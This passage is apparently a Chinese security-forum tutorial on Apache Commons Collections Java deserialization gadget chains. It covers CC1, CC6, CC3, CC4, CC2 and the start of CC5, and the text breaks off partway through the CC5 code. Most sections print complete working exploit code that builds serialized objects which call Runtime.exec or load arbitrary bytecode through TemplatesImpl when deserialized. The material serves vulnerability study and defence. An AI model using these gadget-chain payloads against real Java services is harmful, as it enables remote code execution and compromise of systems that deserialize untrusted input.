# Java安全 - CommonsCollections链 全系列详解

> **来源**: https://forum.butian.net/share/2857  
> **文章ID**: 2857

---

前言
==

在自己有一定的Java审计和Java反序列化的基础上重新回顾(其实我已经看了好几遍了，每次看的感觉都不一样，故自己再次总结一下CC的全系列)，其实归根来说，CC系列其实就是一个链子的排列组合，从我最后的图可以看出，其实就是一个迷宫，完美的诠释了什么叫`条条大路通罗马`​的含义

‍

CC1
===

CC1有两条 分别是 `TransformedMap`​ 跟`LazyMap`​

环境配置如下

```xml
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>
```

‍

`TransformedMap`​
-----------------

‍

### `InvokerTransformer`​​​

作者是先从 `commons-collections-3.2.1.jar!\org\apache\commons\collections\Transformer`​在这里找到了一个接口 `Transformer`​ 他接受一个Object的传参，并且返回的也是Object，而他的实现类都在`\commons-collections-3.2.1.jar!\org\apache\commons\collections\functors`​(这是`commons-collections`​自定义的一组功能类)

‍

作者找到了`InvokerTransformer`​这个实现类中的`transform`​方法可以任意方法调用的写法

‍

![image](images/attach-5e91b25c5b0dc0a4d9802437d03b393f9684fe0b.png)​

如何调用呢？其实也很简单，先弹个计算器

```java
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        invokerTransformer.transform(Runtime.getRuntime());
```

![image](images/attach-640c15dabb1451bb2e62b84308b737acbf7a55f8.png)​

那么我们找到了危险函数，我们就往上找谁去能够调用`transform`​并且是可以传入可控的Object对象的

‍

### `TransformedMap`​​​

作者就找到了`org\apache\commons\collections\map\TransformedMap`​类中的`checkSetValue`​方法是接收`Object`​对象并且调用了`transform`​方法，并且是`protected`​属性

那么聪这个函数来看有颜色变换而且现在来看并不知道`valueTransformer`​是啥，所以我们先去看一下这个函数的构造方法

![image](images/attach-e9476b2feaa1d28a0cd63fde28bf5929dc216ae9.png)发现是传入`Map map, Transformer keyTransformer, Transformer valueTransformer`​ 三个参数，并且把参数给到`this.valueTransformer`​ 但是这里由于是`protected`​属性，所以再去找一下是自己在哪里调用了自己

发现存在一个静态方法`decorate`​，也是传入三个参数直接传入到构造方法中，那么我们从上面的代码进行修改一下看能否调用

![image](images/attach-ecd9776035c6c8ba67422c5a15c91c8771376913.png)​

‍

```java
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
//        invokerTransformer.transform(Runtime.getRuntime());
        HashMap<Object, Object> map = new HashMap<>();
```

![image](images/attach-52e4428b9a74a65dce4597cf51e44ced9de07de8.png)​

### `AbstractInputCheckedMapDecorator`​​​

发现已经赋值了，那我们就看看如何调用这个`protected`​属性的`checkSetValue`​

于是作者找到了 `commons-collections-3.2.1-sources.jar!\org\apache\commons\collections\map\AbstractInputCheckedMapDecorator.java#setValue`​

![image](images/attach-455fa1f0785f99f7d911f03d1f2526a286103cd9.png)​

这里要搞清楚这个类的逻辑，

`AbstractInputCheckedMapDecorator`​ 这个类其实是`TransformedMap`​的父类

![image](images/attach-af377eb140e287e6bef0ab1b22467f7c2075e5b6.png)​

并且这个`setValue`​方法是在一个静态类`MapEntry`​里头的

![image](images/attach-758209bdfe16dc43df0de49662cceca88d658f54.png)​

‍

搞清楚逻辑后，其实这个`MapEntry`​ 就是遍历Map的键值对的一个静态类，在以下代码中就会触发他的方法(其实就是重写了`Map#setvalue`​方法)

```java
        for (Map.Entry entry:transformedMap.entrySet()){
            entry.setValue("aaa");
        }
```

那其实就可以得到，只要去对这个键值对进行`setValue`​方法即可触发

![image](images/attach-03b15336ab8881fb1030004e9ea1291e311cff2a.png)​

所以现在只要把我们的Runtime对象传入到value值即可触发任意方法调用

```java
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        Runtime r = Runtime.getRuntime();
        HashMap<Object, Object> map = new HashMap<>();
        map.put("q","q");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,invokerTransformer);
        for (Map.Entry entry:transformedMap.entrySet()){
            entry.setValue(r);
        }
```

![image](images/attach-db9631b1ef987ca5e88db1279cab498fc280d0c4.png)​

那么我们后半条链子就连起来了，接下来就是去找哪个地方是存在`Entry`​的遍历的，并且可以把对象传入的点

### `AnnotationInvocationHandler`​​​

作者就找到了`jdk1.8.0_65\src\sun\reflect\annotation\AnnotationInvocationHandler.java`​ 中的 `readObject`​ 方法是调用了`setValue`​ ，那么其实已经找到`readObject`​就非常好可以进行串联了

![image](images/attach-0906d5473efdace05187cdc0e9118f330f73554c.png)​

那我们来看一下他的构造方法

![image](images/attach-827028a3b0d8eab8f3e9277636a0281c84ca3d3d.png)​

也很简单，就是传一个注解和一个Map类，又因为他不是public类，所以必须得用反射去实例化他，那么就其实挺简单，就反射区实例化他即可，然后把我们设计好的`Entry`​传给他即可

```java
        Class c =  Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor cl  =  c.getDeclaredConstructor(Class.class,Map.class);
        cl.setAccessible(true);
        cl.newInstance(Override.class,transformedMap);
```

但是这里仍然存在几个问题

- `Runtime`​对象是不可以序列化的，需要用反射进行序列化
- `setValue`​方法的参数貌似不可控
- 有两个if判断需要进去

‍

先解决第一个问题 如何让`Runtime`​对象可以序列化

‍

因为Class类是可以反序列化的，所以只要让`Runtime`​为Class类并且调用其方法即可

![image](images/attach-5a3e876500dfbc08122d8874775fdccda22d6d08.png)​

他是存在`getRuntime`​的静态方法的，所以可以直接调用

```java
        //        Runtime.getRuntime().exec("calc");
        Class r =  Runtime.class;
        Method m = r.getMethod("getRuntime",null);
        Runtime o = (Runtime) m.invoke(null,null); // 注意这里是getRuntime()的无参构造
        Method m1 = r.getMethod("exec",String.class);
        m1.invoke(o,"calc");
```

那第一个问题就解决了，那么接下来就是通过`InvokerTransformer`​的反射来吧这个反射重写一遍

```java
        Class r =  Runtime.class;
        Method m  = (Method) new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(r);
        Runtime o = (Runtime) new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(m);
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(o);
```

这样就写好了，但是可以发现这里是前一个接收的对象作为后一个transform方法的输入

‍

所以作者又找到了一个类 `ChainedTransformer`​

构造方法就是传一个`Transformer`​类的数组

![image](images/attach-4121e8e5d3758ab0ef3f42ebce09294215f4cf73.png)​

然后这个类的`transform`​方法就会进行一个链式调用

![image](images/attach-54d5029668e3299e2fd74c3fb4749cd7a1dcec6b.png)​

‍

那么我可以定义一个`Transformer`​的数组然后将`InvokerTransformer`​的发射链式调用写进去然后去触发其`transform`​方法即可

```java
        Class r =  Runtime.class;
        Transformer[] transformers = new Transformer[]{
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},
                new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})} ;

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        chainedTransformer.transform(r);
```

那么现在就剩下两个问题了

我们跟进去看如何去保证两个If语句都进入呢

![image](images/attach-693e49335e3a878c9a865f75f544b821f194c15e.png)​

首先第一个if是比较容易过的，因为他要去找`AnnotationInvocationHandler`​传进来的注解的成员变量，要存在并且map的key可以找到他的成员变量即可，所以做出以下修改

![image](images/attach-110e3fd1887ea9223ec4bfff0fdaebe259c28647.png)​

第二个if就直接过就行了，所以最后的问题就是这一句话

```java
memberValue.setValue(new AnnotationTypeMismatchExceptionProxy(value.getClass() + "[" + value + "]")
```

那是不是这个传入的东西不可控了呢?

‍

这里作者再次找到了一个实现类`ConstantTransformer`​

他的`transform`​方法就是一句话 传入什么都返回常量，那我无所谓value的值，只需要在

![image](images/attach-e12c87f20e0c0e416c0e12a2e48b0fe39922f674.png)​

那如果返回的常量是`Runtime.class`​就可以进行传入了

‍

整条链子就结束了 exp如下

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class Main {

    public static void  serialize(Object obj) throws IOException {
        ObjectOutputStream oos =new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})} ;

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap<>();
        map.put("value","aaa");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);

        Class c =  Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor cls  =  c.getDeclaredConstructor(Class.class,Map.class);
        cls.setAccessible(true);
        Object o = cls.newInstance(Target.class,transformedMap);

        serialize(o);
        unserialize("ser.bin");

    }
}
```

‍

我们来回顾一下这条链子，从正向调过去

```java
反序列化#readObject->
    AnnotationInvocationHandler#readObject(存在setValue)
        MapEntry#setValue(存在checkSetValue)
            transformedMap#checkSetValue(存在transform)
                InvokerTransformer.transform(就可以调用任意方法执行任意操作)
```

```php
                                                    ![image](images/attach-2cdf3e854d83deeaeb2b06783001c5f2e46592b7.png)​
```

‍

‍

`LazyMap`​​
-----------

‍

在调用`transform`​ 方法中，`LazyMap#get()`​也调用了

![image](images/attach-7ed446e0d7a10386090f45cc322e13d446cdcd7d.png)​

但这里存在个条件

1. key要为空

然后就会调用`factory`​的`transform`​，那`factory`​咋来的呢？

可以看看他的静态方法和构造器

![image](images/attach-e8ec3057ce81e1f5043b017dc3b989c446755e62.png)​

‍

![image](images/attach-daec92e1665000d6514f5ca4e50cebd369292401.png)​

‍

可以明显看出 就是构造的时候传进去`Transformer`​类即可

所以可以构造如下代码

```java
 Map<Object,Object> lazyMap = LazyMap.decorate(map,chainedTransformer);
```

那么往上找一下谁调用了`get()`​方法并且可以传值为Object

‍

于是作者找到了`AnnotationInvocationHandler#invoke`​方法调用了`get`​方法

![image](images/attach-c19e7fc567a45371c91245c648d7a01f9c59537c.png)​

又因为这个是`invoke`​方法，所以可以想到如果传入的是一个动态代理，并且调用的这个处理器类就可以默认去执行他的`invoke`​方法，所以其实也很清晰，就是通过传入一个代理类然后去调用一个方法即可触发这个代理调用处理器的`invoke`​方法，那么这里的`invoke`​是有几个条件的

1. 不能调用`equals`​
2. 无参方法

结果`readObject()`​中真的就存在一个不受限制的无参方法`entrySet`​

‍

![image](images/attach-2ce0bd95990e48ad8247720801e677e70aac64e7.png)​

所以这里就可以写exp了，将我们代理类以Map类传入，就可以走通了

```java
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})} ;

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map,chainedTransformer);

        Class c =  Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor cls  =  c.getDeclaredConstructor(Class.class,Map.class);
        cls.setAccessible(true);
        InvocationHandler h = (InvocationHandler) cls.newInstance(Override.class,lazyMap);

        Map maproxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h);

        Object o = cls.newInstance(Override.class,maproxy);

        serialize(o);
        unserialize("ser.bin");
```

![image](images/attach-4e1bd15a892435d5362bf5d9000527574a074574.png)​

这里来解释一下为什么代理Map和实例化两个 因为我们可以看到两个`membervalue`​

第一个实例化对象是把Map给到readObject的`Map.Entry`​来调用`entrySet`​，第二个实例化对象是通过调用`entrySet`​来触发动态代理的`invoke`​方法

![image](images/attach-71aba020dccdaf6d0dad17ed0343780a092a8ae5.png)​

‍

‍

CC6
===

他是不受JDK版本的限制的

‍

CC6其实就是CC1的`LazyMap`​后半段+前半段是`HashMap`​

‍

链子也很简单 作者从HashMap中发现了如下东西

```java
HashMap#readObject
    TiedMapEntry#hashcode
        LazyMap#get
            InvokerTransformer.transform(就可以调用任意方法执行任意操作)
```

先看`TiedMapEntry`​的构造方法比较简单直接传map跟key即可

![image](images/attach-a9f462f93acb81d3fa4feb4812e7671b85214369.png)​

‍

所以简单就可以构造出来，这里先放序列化就可以调用calc的

```java
     Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})} ;

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map,chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "aa");
        HashMap<Object, Object> map2 = new HashMap<>();
        map2.put(tiedMapEntry, "bbb");

        serialize(map2);
```

为啥呢，从URLDNS链也可以知道 ，`HashMap#put()`​方法也是可以触发`hashcode`​的，所以我们还需要用反射的方式去修改点属性让他反序列化出来也没问题

所以可以先让他put进去的时候是空的，然后put完去序列化的时候通过反射再给他赋值

![image](images/attach-5cf62c707035449a9cc7fe401726d64befa6650c.png)​

但是这里反序列化还是不会执行，为什么呢？通过调试我们发现他在`LazyMap#get()`​方法的时候最后会把key return回去

![image](images/attach-4bafee074ceb7875912bef1e54f00a95b77a7992.png)​

那也就是说在put方法之后我们去把这个key给`remote`​掉就好了

最终exp

```java
 Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})} ;

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map,new ConstantFactory(1));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "aa");
        HashMap<Object, Object> map2 = new HashMap<>();
        map2.put(tiedMapEntry, "bbb");
        lazyMap.remove("aa");

        Class c = LazyMap.class;
        Field factoryfield = c.getDeclaredField("factory");
        factoryfield.setAccessible(true);
        factoryfield.set(lazyMap,chainedTransformer);

        serialize(map2);
        unserialize("ser.bin");
```

![image](images/attach-9d469bb6431e86ca83fab14f32b61ce110cb3510.png)​

‍

CC3
===

‍

CC3其实后半段就是动态类加载，其实就是跟`Fastjson`​的<=1.2.24的Jdk7u21链子是一样的，(因为我先学了fastjson)

TemplatesImpl链
--------------

‍

### `TemplatesImpl.TransletClassLoader#defineClass()`​​

因为要找`defineclass`​重写过的方法，所以这条链子的作者在`rt.jar`​中找到了defineClass `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.TransletClassLoader.defineClass()`​

![image](images/attach-33d0d25ccb4869399c0bc33e32a07d240f134082.png)​

‍

### `TemplatesImpl#defineTransletClasses()`​​

但是在实际场景中，因为defineClass方法作用域却是不开放的(就是并不是public方法，所以需要找谁去调用了他)，所以我们很很难直接利用到它所以我们要去找谁调用了这个`defineClass`​函数 ，于是找到了`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses()`​

![image](images/attach-b670648641342184a7ff88df6ab4985d7546f484.png)​

### `TemplatesImpl#getTransletInstance()`​​

再往上找看哪里是`public`​属性的方法调用了他，并且在上述方法中是对字节码进行了加载，并没有初始化，所以要找到链子的某个地方进行了初始化并且最终的入口方法是public方法，最后作者在这里找到了

`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance()`​

![image](images/attach-e6b6b67597a0b4941b5678d4e336d592a1ed3f7b.png)​

![image](images/attach-3a7a11a5a520f7a9ba6441339ced87b606ecde6c.png)​

可以看到在加载了`_class`​属性后进行了`.newInstance()`​初始化，完全符合我们的要求

但是他仍然是私有方法

### `TemplatesImpl#newTransformer()`​​

所以继续往上找于是找到了`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer()`​

![image](images/attach-67eeee885f3af86f7b9b773107588255cc4263e5.png)​

‍

所以我们先来写一个demo(因为`_tfactory`​在反序列化的时候会自动实例化赋值，但是直接调用并不会所以这里写demo的时候需要自行加上才能执行成功)

```java
   TemplatesImpl templates = new TemplatesImpl();
        Class tc =  templates.getClass();
        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);

        byte[] code = Files.readAllBytes(Paths.get("E:\\Java_project\\Serialization_Learing\\target\\classes\\Test.class"));
        byte[][] codes = {code};

        bytecodesField.set(templates, codes);
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "test");
        Field _tfField = tc.getDeclaredField("_tfactory");
        _tfField.setAccessible(true);
        _tfField.set(templates, new TransformerFactoryImpl());
        templates.newTransformer();
```

‍

这里有个要注意的点

- 455行会去进行强制类型转换为`AbstractTranslet`​类，那我们是不是要传该类进来呢？

![image](images/attach-407f23d1d80bbdb83870e675c1b0d703b734aca4.png)​

![image](images/attach-41a04f5c056f171d51d97a1dafc850b61aa1cf9b.png)​

在这个地方他会去判断这个父类是否为 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`​

所以加载的字节码文件要是集成了`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`​这个的类

- 这里`_bytecodes`​ 不能为空

![image](images/attach-bacac49afcf2cb9cac265816a3b922ae6bb81f5f.png)​

‍

![image](images/attach-4d0eaa78735da74f3843a4fff291d185a7cc3428.png)​

‍

那么后半段执行代码的点就可以修改了，其实跟CC1基本都不变，只是修改了一下执行代码的形式，

```java

        TemplatesImpl templates = new TemplatesImpl();
        Class tc =  templates.getClass();
        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E:\\Java_project\\Serialization_Learing\\target\\classes\\Test.class"));
        byte[][] codes = {code};
        bytecodesField.set(templates, codes);
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "test");
        Field _tfField = tc.getDeclaredField("_tfactory");
        _tfField.setAccessible(true);
        _tfField.set(templates, new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer", null, null)};

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> map = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map,chainedTransformer);

        Class c =  Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor cls  =  c.getDeclaredConstructor(Class.class,Map.class);
        cls.setAccessible(true);
        InvocationHandler h = (InvocationHandler) cls.newInstance(Override.class,lazyMap);

        Map maproxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h);

        Object o = cls.newInstance(Override.class,maproxy);

        serialize(o);
        unserialize("ser.bin");
```

‍

上述其实是去找谁去调用了`newTransformer()`​导致可以连接上动态类加载的`TemplatesImpl`​链，所以想到了`InvokerTransformer`​当中的类似反射的代码来完成调用但是如果`InvokerTransformer`​被ban了，才到真正的CC3 ，因为是绕过了`InvokerTransformer`​的限制，采用了另一条链子

‍

作者继续往上跟看谁调用了`newTransformer()`​，于是找到了`com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.java`​

![image](images/attach-82e73e764a8613a44b8b5038b42409c5080a1b90.png)​

`TrAXFilter`​这个类是直接传入Templates类后调用的构造方法就调用了`newTransformer()`​方法，也就是说只要找到一个地方可以调用`TrAXFilter`​他的构造方法 ，就可以成功连接上动态类加载的后半条链子了

‍

于是作者找到了`\commons-collections-3.2.1.jar!\org\apache\commons\collections\functors\InstantiateTransformer.java`​

看一下他的`transform`​方法

![image](images/attach-23ca8053498635323d1929e1bfb9d8af64ba2b9b.png)​

那么我们就可以根据其构造方法去构造，然后通过之前的办法去调用其`transform`​即可全部连接起来

‍

![image](images/attach-a54769b195c461c3bf7a478442c695e8427d59b3.png)​

‍

写出以下demo

```java
        TemplatesImpl templates = new TemplatesImpl();
        Class tc =  templates.getClass();
        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E:\\Java_project\\Serialization_Learing\\target\\classes\\Test.class"));
        byte[][] codes = {code};
        bytecodesField.set(templates, codes);
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "test");
        Field _tfField = tc.getDeclaredField("_tfactory");
        _tfField.setAccessible(true);
        _tfField.set(templates, new TransformerFactoryImpl());

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
        instantiateTransformer.transform(TrAXFilter.class);
```

这样其实就可以调用`TrAXFilter`​的构造方法了，那么现在就是去整条链子串起来即可

最后exp

```java
TemplatesImpl templates = new TemplatesImpl();
        Class tc =  templates.getClass();
        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E:\\Java_project\\Serialization_Learing\\target\\classes\\Test.class"));
        byte[][] codes = {code};
        bytecodesField.set(templates, codes);
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "test");

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
                };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> map = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map,chainedTransformer);
        Class c =  Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor cls  =  c.getDeclaredConstructor(Class.class,Map.class);
        cls.setAccessible(true);
        InvocationHandler h = (InvocationHandler) cls.newInstance(Override.class,lazyMap);
        Map maproxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h);
        Object o = cls.newInstance(Override.class,maproxy);
```

其实就是利用了`InstantiateTransformer`​可以执行构造方法拼接了一下后续的动态类加载这样的思路

![image](images/attach-d31d371d706e7cab894534b6c563f43fd98a0765.png)​

‍

‍

‍

CC4
===

从CC4开始就要换依赖了

```xml
    <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-collections4</artifactId>
            <version>4.0</version>
        </dependency>
    </dependencies>
```

‍

### `TransformingComparator#compare()`​​​

其实在CC4中也是没有变化太多，而是新引入了一个CC4的包，跟原来CC1的包进行了拼接，那么作者其实是在CC4的包中去寻找调用`transform`​方法的类，在

`commons-collections4-4.0.jar!\org\apache\commons\collections4\comparators\TransformingComparator#compare()`​中找到了调用`transform`​方法

![image](images/attach-8da7997657df80179c3b980e10e7f88d1125ea71.png)​

这里也是说的很模糊，反正就是看谁去调用了这个`compare`​方法，于是找到了

‍

### `PriorityQueue#siftDownUsingComparator()`​​​

`jdk1.8.0_65\src.zip!\java\util\PriorityQueue#siftDownUsingComparator()`​调用了`compare`​方法

‍

![image](images/attach-24e964a37874e98a8590a6b3a1a6f9ca10005d67.png)​

‍

再往上跟就是谁去调用了`siftDownUsingComparator`​ ，找到的是 `jdk1.8.0_65\src.zip!\java\util\PriorityQueue#siftDown`​

‍

![image](images/attach-64fa6bad8c112834973bfc2fb10ca6626ae34614.png)​

‍

继续往上跟 找到的是 `jdk1.8.0_65\src.zip!\java\util\PriorityQueue#heapify()`​

‍

![image](images/attach-15cb266ebf2dff5b1378f7e734d8aeebe7725c72.png)​

### `PriorityQueue#readObject()`​​​

继续往上跟 就是`jdk1.8.0_65\src.zip!\java\util\PriorityQueue#readObject()`​

![image](images/attach-7f063a8bde9c45a9ba21f94af5d461d5972a8619.png)​

‍

至此就跟到`readObject`​结束了，所以只需要一个入口类去触发这个`readObject`​方法即可传入，那么接下里就是构造EXP了

‍

这里有几个要注意的点

- 这里的`site`​必须为两个否则进不去这个`siftDown`​方法中

![image](images/attach-f98dfd772021cb8e6467a4cac98c4b52c97f7bd6.png)​

‍

- 其实他在`add`​方法的时候也会去调用`compare`​方法，所以跟URLDNS或者CC3一样都要去反射把值修改一下

‍

- CC4跟CC3的包其实更新了一个版本后在`TransformingComparator`​中是有改变的，在CC4中这个类继承了`Serializable`​接口导致可以序列化

![image](images/attach-4241ad000ac0ccceafb06b369d7761b3b605612d.png)​

而在CC3中是并没有进行序列化的继承的

![image](images/attach-acde862d36eb75e45b4caca4781fd0db6e84c367.png)​

最后的EXP

```java
TemplatesImpl templates = new TemplatesImpl();
        Class tc =  templates.getClass();
        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E:\\Java_project\\Serialization_Learing\\target\\classes\\Test.class"));
        byte[][] codes = {code};
        bytecodesField.set(templates, codes);
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "test");

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);

        priorityQueue.add(templates);
        priorityQueue.add(2);

        Class c = transformingComparator.getClass();
        Field transformingComparatorfield =  c.getDeclaredField("transformer");
        transformingComparatorfield.setAccessible(true);
        transformingComparatorfield.set(transformingComparator,chainedTransformer);

        serialize(priorityQueue);
        unserialize("ser.bin");
```

‍

CC2
===

一样要依赖于CC4 这里跳了一下直接走了`TemplatesImpl#newTransformer()`​去动态加载类

```java
TemplatesImpl templates = new TemplatesImpl();
        Class tc =  templates.getClass();
        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E:\\Java_project\\Serialization_Learing\\target\\classes\\Test.class"));
        byte[][] codes = {code};
        bytecodesField.set(templates, codes);
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "test");

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});

        InvokerTransformer<Object,Object> invokerTransformer = new InvokerTransformer<>("newTransformer", new Class[]{}, new Object[]{});

        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);

        priorityQueue.add(templates);
        priorityQueue.add(2);

        Class c = transformingComparator.getClass();
        Field transformingComparatorfield =  c.getDeclaredField("transformer");
        transformingComparatorfield.setAccessible(true);
        transformingComparatorfield.set(transformingComparator,invokerTransformer);

        serialize(priorityQueue);
        unserialize("ser.bin");
```

‍

CC5
===

CC5其实也是一种排列组合，就是作者在`TiedMapEntry`​中还找到了`toString`​方法也可以调用`LazyMap#get()`​

![image](images/attach-d7256f41ce0f361df4a4f185671d2da9d918330a.png)​

都是一样的

所以去找了一下谁去调用了`toString`​方法 找到了`\src.zip!\javax\management\BadAttributeValueExpException.java`​

![image](images/attach-a7abb743b8118207dbfe37c882c6ca38a7086c03.png)​

那么也是拼接到`LazyMap#get()`​就好了

由于这里组长并没有给出EXP，在自己有一定的理解情况下补充一下

‍

一开始我打算直接加入这一行代码就可以完成逻辑了

```java
BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(tiedMapEntry);
```

但是发现并没有成功，所以继续断点看看

![image](images/attach-7a352e6e29777219eba1993814000de5834d54cd.png)​

发现这个`valObj`​是String型的，所以得要用反射去把这个值修改为`TiedMapEntry#ToString`​即可

‍

最后修改为

```java
     Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})} ;

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map,new ConstantFactory(1));

